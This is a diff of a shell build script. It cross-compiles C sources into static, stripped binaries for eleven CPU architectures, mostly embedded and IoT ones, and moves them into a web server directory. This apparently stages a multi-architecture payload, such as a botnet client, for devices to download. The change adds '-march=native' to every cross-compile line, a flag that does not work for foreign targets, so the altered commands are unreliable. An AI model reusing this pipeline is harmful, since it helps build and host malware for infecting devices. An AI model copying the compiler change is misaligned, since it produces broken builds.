@@ -35,17 +35,17 @@ apt install gcc-i686-linux-gnu -y
 apt install gcc-arm-linux-gnueabihf -y
 apt install gcc-sh4-linux-gnu -y
 
-powerpc64-linux-gnu-gcc *.c -o powerpc64 -pthread -DARCH_powerpc64 -static -O3 -ffunction-sections -Wl,--gc-sections -s
-mips-linux-gnu-gcc *.c -o mips -pthread -DARCH_mips -static -O3 -ffunction-sections -Wl,--gc-sections -s
-mipsel-linux-gnu-gcc *.c -o mipsel -pthread -DARCH_mipsel -static -O3 -ffunction-sections -Wl,--gc-sections -s
-sparc64-linux-gnu-gcc *.c -o sparc -pthread -DARCH_sparc -static -O3 -ffunction-sections -Wl,--gc-sections -s
-arm-linux-gnueabi-gcc *.c -o arm -pthread -DARCH_arm -static -O3 -ffunction-sections -Wl,--gc-sections -s
-aarch64-linux-gnu-gcc *.c -o aarch64 -pthread -DARCH_aarch64 -static -O3 -ffunction-sections -Wl,--gc-sections -s
-m68k-linux-gnu-gcc *.c -o m68k -pthread -DARCH_m68k -static -O3 -ffunction-sections -Wl,--gc-sections -s
-i686-linux-gnu-gcc *.c -o i686 -pthread -DARCH_i686 -static -O3 -ffunction-sections -Wl,--gc-sections -s
-arm-linux-gnueabihf-gcc *.c -o armhf -pthread -DARCH_arm -static -O3 -ffunction-sections -Wl,--gc-sections -s
-x86_64-linux-gnu-gcc *.c -o x86_64 -pthread -DARCH_x86_64 -static -O3 -ffunction-sections -Wl,--gc-sections -s
-sh4-linux-gnu-gcc *.c -o sh4 -pthread -DARCH_sh4 -static -O3 -ffunction-sections -Wl,--gc-sections -s
+powerpc64-linux-gnu-gcc *.c -o powerpc64 -pthread -DARCH_powerpc64 -static -O3 -ffunction-sections -Wl,--gc-sections -s -march=native -std=c99
+mips-linux-gnu-gcc *.c -o mips -pthread -DARCH_mips -static -O3 -ffunction-sections -Wl,--gc-sections -s -march=native -std=c99
+mipsel-linux-gnu-gcc *.c -o mipsel -pthread -DARCH_mipsel -static -O3 -ffunction-sections -Wl,--gc-sections -s -march=native -std=c99
+sparc64-linux-gnu-gcc *.c -o sparc -pthread -DARCH_sparc -static -O3 -ffunction-sections -Wl,--gc-sections -s -march=native -std=c99
+arm-linux-gnueabi-gcc *.c -o arm -pthread -DARCH_arm -static -O3 -ffunction-sections -Wl,--gc-sections -s -march=native -std=c99
+aarch64-linux-gnu-gcc *.c -o aarch64 -pthread -DARCH_aarch64 -static -O3 -ffunction-sections -Wl,--gc-sections -s -march=native -std=c99
+m68k-linux-gnu-gcc *.c -o m68k -pthread -DARCH_m68k -static -O3 -ffunction-sections -Wl,--gc-sections -s -march=native -std=c99
+i686-linux-gnu-gcc *.c -o i686 -pthread -DARCH_i686 -static -O3 -ffunction-sections -Wl,--gc-sections -s -march=native -std=c99
+arm-linux-gnueabihf-gcc *.c -o armhf -pthread -DARCH_arm -static -O3 -ffunction-sections -Wl,--gc-sections -s -march=native -std=c99
+x86_64-linux-gnu-gcc *.c -o x86_64 -pthread -DARCH_x86_64 -static -O3 -ffunction-sections -Wl,--gc-sections -s -march=native -std=c99
+sh4-linux-gnu-gcc *.c -o sh4 -pthread -DARCH_sh4 -static -O3 -ffunction-sections -Wl,--gc-sections -s -march=native -std=c99
 
 #move binaries to apache2 dir
 mv mipsel mips i686 armhf aarch64 m68k arm sparc powerpc64 x86_64 sh4 /var/www/html
